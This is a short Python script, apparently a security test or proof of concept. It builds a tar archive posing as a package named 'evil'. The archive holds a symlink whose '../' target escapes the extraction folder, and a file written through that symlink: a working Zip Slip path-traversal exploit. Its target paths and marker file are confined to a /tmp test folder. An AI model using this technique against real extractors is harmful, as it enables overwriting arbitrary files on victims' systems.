import tarfile, io, os
out_path = "/tmp/zipslip-test/evil-dotdot-link.tgz"
with tarfile.open(out_path, "w:gz") as tar:
    pkg_info = tarfile.TarInfo("package/package.json")
    pkg_content = b'{"version":"0.2.1","name":"evil"}'
    pkg_info.size = len(pkg_content)
    tar.addfile(pkg_info, io.BytesIO(pkg_content))
    # Symlink with ../ in linkname; many tars block '../' in symlink destinations?
    sym = tarfile.TarInfo("package/relsym")
    sym.type = tarfile.SYMTYPE
    sym.linkname = "../../../../../../../tmp/zipslip-test/escape-target"
    tar.addfile(sym)
    # then pack-through
    evil = tarfile.TarInfo("package/relsym/rel-pwn")
    evil_content = b"REL_SYM_PWN\n"
    evil.size = len(evil_content)
    tar.addfile(evil, io.BytesIO(evil_content))
